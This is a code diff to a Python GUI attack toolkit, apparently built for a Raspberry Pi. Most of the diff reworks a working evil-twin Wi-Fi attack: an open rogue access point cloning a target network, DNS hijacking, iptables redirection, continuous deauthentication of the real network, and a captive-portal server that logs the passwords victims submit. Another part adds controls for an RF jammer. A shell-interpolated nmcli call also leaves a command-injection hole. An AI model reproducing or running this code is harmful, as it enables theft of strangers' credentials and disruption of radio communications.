@@ -1239,6 +1239,8 @@ class RedTeamApp(tk.Tk):
         self.evil_twin_stop = False
 
         def ataque():
+            import shutil  # Importación segura para copiar directorios
+            
             self._evil_twin_limpiar_procesos()
             ap_iface = self.wifi_state["ap_iface"]
             deauth_iface = self.wifi_state.get("deauth_iface")
@@ -1251,17 +1253,23 @@ class RedTeamApp(tk.Tk):
                     f"/sys/class/net/{deauth_iface}mon") else deauth_iface
                 self.wifi_state["mon_deauth"] = mon_deauth
 
+            # 1. Copia segura nativa de Python (Evita fallos silenciosos de Bash)
             portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
             tmp_web = f"/tmp/evil_twin_web_{timestamp}"
             os.makedirs(tmp_web, exist_ok=True)
-            subprocess.run(["cp", "-r", f"{portals_dir}/{portal}/.", tmp_web], stdout=subprocess.DEVNULL,
-                           stderr=subprocess.DEVNULL)
-
-            # Como session_dir es absoluta, cred_log también lo será (Ej: /home/pi/Resultados_...)
-            cred_log = os.path.join(session_dir, "credentials.log")
             
+            try:
+                ruta_origen = os.path.join(portals_dir, portal)
+                # Copia todo el contenido de la carpeta del portal a la carpeta temporal
+                shutil.copytree(ruta_origen, tmp_web, dirs_exist_ok=True)
+            except Exception as e:
+                self.escribir_consola(f"[!] Aviso al copiar archivos: {e}")
+
+            cred_log = os.path.abspath(os.path.join(session_dir, "credentials.log"))
+            
+            # 2. Servidor Web Multihilo y Blindado contra Bucles
             capture_script = f'''#!/usr/bin/env python3
-import http.server, urllib.parse, os, socketserver
+import http.server, urllib.parse, os
 from datetime import datetime
 
 LOG = "{cred_log}"
@@ -1270,127 +1278,120 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         parsed_path = urllib.parse.urlparse(self.path)
         
-        # Captura por GET por si acaso
+        # Captura por URL (GET) si es que el portal lo envía así
         if parsed_path.query:
-            params = urllib.parse.parse_qs(parsed_path.query)
             try:
+                params = urllib.parse.parse_qs(parsed_path.query)
                 with open(LOG, "a") as f: 
                     f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} DATA_GET:{{params}}\\n")
-                    f.flush()
-                    os.fsync(f.fileno())
-            except Exception as e:
-                pass # Evita crashear el servidor si hay error de escritura
+                    f.flush(); os.fsync(f.fileno())
+            except: pass
 
-        # Lógica de Redirección para Portales Cautivos (Android/iOS)
-        local_path = self.translate_path(parsed_path.path)
-        if not os.path.isfile(local_path) or parsed_path.path == "/":
+        # Interpretar la raíz "/" como "/index.html"
+        if parsed_path.path == "/":
+            self.path = "/index.html"
+            
+        local_path = self.translate_path(self.path)
+        
+        # Lógica de Redirección (Captive Portal Detector)
+        if not os.path.isfile(local_path):
+            # Prevención del bucle infinito si index.html no se copió correctamente
+            if self.path == "/index.html":
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b"<html><body><h2>Error de Servidor: El archivo index.html no existe.</h2></body></html>")
+                return
+                
+            # Si piden algo distinto (ej. generate_204), redirigir al portal
             self.send_response(302)
             self.send_header("Location", "http://10.0.0.1/index.html")
             self.end_headers()
             return
             
-        return http.server.SimpleHTTPRequestHandler.do_GET(self)
+        return super().do_GET()
 
     def do_POST(self):
-        length = int(self.headers.get("Content-Length", 0))
-        data = self.rfile.read(length).decode("utf-8", "ignore")
-        params = urllib.parse.parse_qs(data)
-        
-        # Guardado de credenciales con manejo de errores
         try:
+            length = int(self.headers.get("Content-Length", 0))
+            data = self.rfile.read(length).decode("utf-8", "ignore")
+            params = urllib.parse.parse_qs(data)
+            
             with open(LOG, "a") as f: 
                 f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} CREDENCIALES:{{params}}\\n")
-                f.flush() 
-                os.fsync(f.fileno())
-        except Exception as e:
-            pass
+                f.flush(); os.fsync(f.fileno())
+        except: pass
             
-        # Redirección de éxito
         self.send_response(302)
         self.send_header("Location", "http://10.0.0.1/success.html")
         self.end_headers()
         
-    def log_message(self, format, *args): 
-        pass # Silenciar logs
+    def log_message(self, format, *args): pass # Silencia logs para no saturar memoria
 
 if __name__ == "__main__":
     os.chdir("{tmp_web}")
-    with socketserver.TCPServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd: 
+    # ThreadingHTTPServer atiende múltiples peticiones sin congelarse
+    class ThreadedServer(http.server.ThreadingHTTPServer):
+        allow_reuse_address = True
+        
+    with ThreadedServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd: 
         httpd.serve_forever()
 '''
             with open(f"{tmp_web}/capture.py", "w") as f:
                 f.write(capture_script)
                 
-            # success.html adaptado para que coincida un poco con los colores de tu portal
             if not os.path.exists(f"{tmp_web}/success.html"):
                 with open(f"{tmp_web}/success.html", "w") as f:
-                    f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:-apple-system, BlinkMacSystemFont, sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p style="color:#b0c7db;">Ya puede cerrar esta ventana y navegar normalmente.</p></body></html>')
+                    f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:-apple-system, sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p style="color:#b0c7db;">Ya puede cerrar esta ventana.</p></body></html>')
 
-            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL,
-                           stderr=subprocess.DEVNULL)
+            # 3. Configuración del Access Point
+            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red['essid']}\nhw_mode=g\nchannel={int(red['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
+            
             with open("/tmp/hostapd_evil.conf", "w") as f:
                 f.write(hostapd_conf)
-            
-            
+                
             self.evil_twin_procs['hostapd'] = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
-                                                               stdout=subprocess.DEVNULL,
-                                                               stderr=subprocess.DEVNULL)
+                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(3)
 
-            # 1. Quitarle el control a NetworkManager para que no borre nuestra IP
+            # 4. Solución DHCP Raspberry Pi (Prevenir que NetworkManager borre la IP)
             subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
-            
-            # 2. Reiniciar la interfaz y forzar la asignación de IP
             subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
-            
-            # Crucial: Esperar a que el kernel de PiOS registre la IP antes de abrir dnsmasq
             time.sleep(1.5) 
 
-            # 3. Configuración dnsmasq a prueba de fallos (except-interface=lo previene choques en el puerto 53)
             dnsmasq_conf = f"interface={ap_iface}\nexcept-interface=lo\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
             with open("/tmp/dnsmasq_evil.conf", "w") as f:
                 f.write(dnsmasq_conf)
-            
-            # Limpiar procesos fantasma que hayan quedado colgados
+                
             subprocess.run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
-            
             self.evil_twin_procs['dnsmasq'] = subprocess.Popen(
                 ["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(2)
-            # ===================================
 
+            # 5. Iptables limpio (Sin redirigir el puerto 443 para evitar crasheos del servidor Python)
             subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
             subprocess.run(
                 ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT",
                  "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT",
-                 "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "80", "-j", "ACCEPT"],
-                stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"],
-                stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
-                stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "67", "-j", "ACCEPT"],
-                stderr=subprocess.DEVNULL)
+            # Solo permitimos el tráfico necesario
+            for port in ["80", "53"]:
+                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+            for port in ["53", "67"]:
+                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
 
+            # 6. Lanzar servidor web de captura en segundo plano
             self.evil_twin_procs['capture'] = subprocess.Popen(["sudo", "python3", f"{tmp_web}/capture.py"],
-                                                               stdout=subprocess.DEVNULL,
-                                                               stderr=subprocess.DEVNULL)
+                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(1)
 
+            # 7. Iniciar inyección de desautenticación si se configuró
             subprocess.run(["sudo", "iw", "dev", mon_deauth, "set", "channel", red['ch']], stderr=subprocess.DEVNULL,
                            stdout=subprocess.DEVNULL)
             deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red['bssid']]
@@ -1400,6 +1401,7 @@ if __name__ == "__main__":
             self.evil_twin_procs['deauth'] = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL,
                                                               stderr=subprocess.DEVNULL)
 
+            # 8. Bucle de monitoreo para mostrar credenciales en la interfaz de la Pi
             last_lines = 0
             while not self.evil_twin_stop:
                 time.sleep(2)
@@ -1411,6 +1413,7 @@ if __name__ == "__main__":
                                 self.escribir_consola(f"[+] Cred: {line.strip()}")
                             last_lines = len(lines)
 
+            # Cierre seguro al presionar "DETENER ATAQUE"
             self._evil_twin_detener_procesos()
             self._evil_twin_limpiar_iptables(ap_iface)
             self.escribir_consola("[+] Evil Twin detenido.")
@@ -1673,61 +1676,126 @@ if __name__ == "__main__":
     # ==========================================
     # MENÚ BLUETOOTH BLE
     # ==========================================
-    def _init_gadget(self):
-        if self._gadget_initialized:
-            return
-        self._gadget_initialized = True
+    def _ensure_gadget(self, force_reconnect=False):
+        """Verifica o restablece la conexión aislando la UI de los hilos."""
+        msg = None
         try:
             from gadget_handler import BLEGadget
-            self.gadget = BLEGadget()
-            if self.gadget.is_available():
-                self.gadget_available = True
-                self.escribir_consola("[+] Gadget NRF24 Jammer conectado.")
-            else:
-                self.gadget_available = False
-                self.escribir_consola("[!] Gadget NRF24 Jammer no detectado.")
+            if self.gadget is None:
+                self.gadget = BLEGadget()
+            elif force_reconnect or not self.gadget.is_available():
+                self.gadget.reconnect()
+                
+            self.gadget_available = self.gadget.is_available()
+            if self.gadget_available:
+                msg = "[+] Gadget NRF24 conectado y listo."
         except Exception as e:
             self.gadget = None
             self.gadget_available = False
-            self.escribir_consola(f"[!] Error al inicializar gadget BLE: {e}")
+            msg = f"[!] Error inicializando gadget: {e}"
+            
+        if msg:
+            # Enviar mensaje a la consola de forma segura desde el hilo
+            self.after(0, lambda m=msg: self.escribir_consola(m))
+            
+        return self.gadget_available
 
     def show_nrf_jammer_menu(self):
         self.limpiar_main_frame()
         self.agregar_boton_atras(self.show_inicio_menu)
         ttk.Label(self.main_frame, text="NRF24 JAMMER", style='Title.TLabel').pack(pady=2)
-        self._init_gadget()
         
+        loading_lbl = ttk.Label(self.main_frame, text="Detectando puerto USB...", style='Gray.TLabel')
+        loading_lbl.pack(pady=20)
+
+        def async_check():
+            # Forzamos reconexión limpia cada vez que entramos al menú
+            # Esto soluciona los problemas de hot-plugging.
+            connected = self._ensure_gadget(force_reconnect=True)
+            self.after(0, lambda: self._build_nrf_interface(connected, loading_lbl))
+
+        threading.Thread(target=async_check, daemon=True).start()
+
+    def _build_nrf_interface(self, connected, loading_lbl=None):
+        if loading_lbl is not None and loading_lbl.winfo_exists():
+            loading_lbl.destroy()
+
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_inicio_menu)
+        ttk.Label(self.main_frame, text="NRF24 JAMMER", style='Title.TLabel').pack(pady=2)
+
         scroll_nrf = ScrollableFrame(self.main_frame, max_items=10)
         scroll_nrf.pack(fill='both', expand=True, padx=2, pady=2)
-        
-        gadget_status = "Conectado" if self.gadget_available else "Desconectado"
-        status_color = "#00ff00" if self.gadget_available else "#ff4d4d"
-        ttk.Label(scroll_nrf.scrollable_frame, text=f"Hardware: {gadget_status}",
-                  foreground=status_color, font=('Helvetica', 9)).pack(pady=(2, 10))
-        if self.gadget_available:
+
+        status_txt = "Conectado" if connected else "Desconectado"
+        status_clr = "#00ff00" if connected else "#ff4d4d"
+        ttk.Label(scroll_nrf.scrollable_frame, text=f"Estado: {status_txt}",
+                  foreground=status_clr, font=('Helvetica', 10, 'bold')).pack(pady=(2, 10))
+
+        if connected:
             scroll_nrf.add_button(text="Activar Jamming", command=self._nrf_start, style='Red.TButton', width=28)
             scroll_nrf.add_button(text="Detener Jamming", command=self._nrf_stop, style='Danger.TButton', width=28)
             scroll_nrf.add_button(text="Consultar Estado", command=self._nrf_status, style='Gray.TButton', width=28)
+            scroll_nrf.add_button(text="Reconectar / Reset", command=self._async_reconnect, style='Gray.TButton', width=28)
         else:
             ttk.Label(scroll_nrf.scrollable_frame, text="Conecta el ESP32 por USB.", style='Dark.TLabel').pack(pady=5)
-            scroll_nrf.add_button(text="Reintentar Conexión", command=self.show_nrf_jammer_menu, style='Gray.TButton', width=28)
+            scroll_nrf.add_button(text="Buscar Dispositivo", command=self._async_reconnect, style='Red.TButton', width=28)
+
         self.mostrar_consola(parent=scroll_nrf.scrollable_frame)
         gc.collect()
 
+    def _async_reconnect(self):
+        """Maneja la reconexión forzando la limpieza del puerto serial previo."""
+        self.escribir_consola("[*] Buscando dispositivo...")
+        def do_reconnect():
+            connected = self._ensure_gadget(force_reconnect=True)
+            if not connected:
+                self.after(0, lambda: self.escribir_consola("[!] No se detectó el hardware."))
+            self.after(0, lambda: self._build_nrf_interface(connected, None))
+            
+        threading.Thread(target=do_reconnect, daemon=True).start()
+
     def _nrf_start(self):
-        if self.gadget_available:
-            self.escribir_consola("[*] Iniciando ataque RF (Barrido continuo)...")
-            self.gadget.sweep_jam(0, 0) # 0 duración = infinito hasta recibir stop
+        if self.gadget and self.gadget.is_available():
+            self.escribir_consola("[*] Iniciando barrido RF continuo...")
+            def run():
+                try:
+                    success = self.gadget.sweep_jam(0, 0)
+                    if success:
+                        self.after(0, lambda: self.escribir_consola("[+] Jamming activado."))
+                    else:
+                        self.after(0, lambda: self.escribir_consola("[!] Sin confirmación del Gadget."))
+                except Exception as e:
+                    self.after(0, lambda e=e: self.escribir_consola(f"[!] Error: {e}"))
+            threading.Thread(target=run, daemon=True).start()
+        else:
+            self.escribir_consola("[!] Gadget desconectado. Pulsa 'Buscar'.")
 
     def _nrf_stop(self):
-        if self.gadget_available:
+        if self.gadget and self.gadget.is_available():
             self.escribir_consola("[*] Deteniendo transmisiones...")
-            self.gadget.stop(0)
+            def run():
+                try:
+                    self.gadget.stop(0)
+                    self.after(0, lambda: self.escribir_consola("[+] Transmisión detenida."))
+                except Exception as e:
+                    self.after(0, lambda e=e: self.escribir_consola(f"[!] Error: {e}"))
+            threading.Thread(target=run, daemon=True).start()
+        else:
+            self.escribir_consola("[!] Gadget desconectado.")
 
     def _nrf_status(self):
-        if self.gadget_available:
-            self.escribir_consola(f"[+] Estado: {self.gadget.status()}")
-
+        if self.gadget and self.gadget.is_available():
+            def _fetch():
+                try:
+                    st = self.gadget.status()
+                    self.after(0, lambda s=st: self.escribir_consola(f"[+] Estado ESP32: {s}"))
+                except Exception as e:
+                    self.after(0, lambda e=e: self.escribir_consola(f"[!] Error: {e}"))
+            threading.Thread(target=_fetch, daemon=True).start()
+        else:
+            self.escribir_consola("[!] Gadget desconectado.")
+    
     # ==========================================
     # MENÚ RUBBER DUCKY 
     # ==========================================
@@ -1822,6 +1890,7 @@ WantedBy=sysinit.target
         self.escribir_consola("[+] Aplicado. Apagando en 3 segundos...")
         self.after(3000, lambda: subprocess.run("sudo poweroff", shell=True))
 
+
     # ==========================================
     # MENÚ UTILIDADES 
     # ==========================================
@@ -1838,9 +1907,11 @@ WantedBy=sysinit.target
             ("Activar Perfil: ANTENA WIFI", lambda: self._cambiar_modo_usb("host")),
             ("Activar Perfil: RUBBER DUCKY", lambda: self._cambiar_modo_usb("gadget")),
             ("Conectar a Red WiFi", self._utils_wifi_seleccionar_interfaz),
+            ("Redes WiFi Guardadas", self._utils_wifi_redes_guardadas), # NUEVA OPCIÓN
             ("Estado de Red WiFi", self._utils_wifi_estado),
             ("Conectar Dispositivo BT", self._utils_bluetooth_seleccionar_interfaz),
-            ("Estado de Adaptador BT", self._utils_bluetooth_estado)
+            ("Estado de Adaptador BT", self._utils_bluetooth_estado),
+            ("Actualizar Sistema (APT)", self._utils_actualizar_sistema) # NUEVA OPCIÓN
         ]
         for texto, cmd in opciones:
             scroll_utils.add_button(text=texto, command=cmd, style='Red.TButton', width=28)
@@ -1860,16 +1931,58 @@ WantedBy=sysinit.target
 
         sys_opts = ttk.Frame(scroll_utils.scrollable_frame, style='Dark.TFrame')
         sys_opts.pack(fill='x', padx=5, pady=5)
-        sys_opts.grid_columnconfigure((0, 1), weight=1)
+        # Modificado para soportar 3 columnas (0, 1, 2)
+        sys_opts.grid_columnconfigure((0, 1, 2), weight=1)
+        
         ttk.Button(sys_opts, text="REINICIAR", style='Danger.TButton',
-                   command=lambda: subprocess.run("reboot", shell=True)).grid(row=0, column=0, padx=2,
-                                                                              sticky="ew")
+                   command=lambda: subprocess.run("reboot", shell=True)).grid(row=0, column=0, padx=2, sticky="ew")
         ttk.Button(sys_opts, text="APAGAR", style='Danger.TButton',
-                   command=lambda: subprocess.run("shutdown -h now", shell=True)).grid(row=0, column=1, padx=2,
-                                                                                        sticky="ew")
+                   command=lambda: subprocess.run("shutdown -h now", shell=True)).grid(row=0, column=1, padx=2, sticky="ew")
+        # NUEVO BOTÓN PARA SALIR DE LA INTERFAZ
+        ttk.Button(sys_opts, text="SALIR", style='Danger.TButton',
+                   command=self.destroy).grid(row=0, column=2, padx=2, sticky="ew")
                                                                                         
         self.mostrar_consola(parent=scroll_utils.scrollable_frame)
         gc.collect()
+        
+    # -------------------- NUEVAS FUNCIONES DE SISTEMA Y RED --------------------
+
+    def _utils_wifi_redes_guardadas(self):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_utils_menu)
+        ttk.Label(self.main_frame, text="REDES GUARDADAS", style='Title.TLabel').pack(pady=2)
+
+        scroll = ScrollableFrame(self.main_frame, max_items=50)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+
+        try:
+            # Filtramos solo las conexiones WiFi guardadas en NetworkManager
+            output = subprocess.check_output("nmcli -t -f NAME,TYPE connection show | grep 802-11-wireless", shell=True, text=True)
+            redes = [line.split(':')[0] for line in output.splitlines() if line]
+
+            if not redes:
+                ttk.Label(scroll.scrollable_frame, text="No hay redes guardadas.", style='Dark.TLabel').pack(pady=10)
+            else:
+                for red in redes:
+                    scroll.add_button(text=red, command=lambda r=red: self._utils_wifi_conectar_guardada(r),
+                                      style='Gray.TButton', width=28)
+        except Exception as e:
+            ttk.Label(scroll.scrollable_frame, text=f"Error leyendo redes.", style='Dark.TLabel').pack()
+
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+        gc.collect()
+
+    def _utils_wifi_conectar_guardada(self, ssid):
+        self.escribir_consola(f"[*] Conectando a red guardada: {ssid}...")
+        # Usamos nmcli connection up en lugar de device wifi connect porque ya tiene la contraseña guardada
+        self.ejecutar_comando(f"nmcli connection up '{ssid}'", use_shell=True)
+
+    def _utils_actualizar_sistema(self):
+        self.escribir_consola("[*] Iniciando actualización de repositorios...")
+        self.escribir_consola("[!] Esto puede tardar varios minutos en la Pi Zero 2.")
+        # Encadenamos update y upgrade. La bandera -y evita que apt pregunte [Y/n] y se quede trabado
+        comando_update = "sudo apt update && sudo DEBIAN_FRONTEND=noninteractive apt upgrade -y"
+        self.ejecutar_comando(comando_update, callback_after=lambda: self.escribir_consola("[+] Actualización completada."), use_shell=True)
 
     # -------------------- UTILIDADES WiFi --------------------
     def obtener_interfaces_wifi(self):
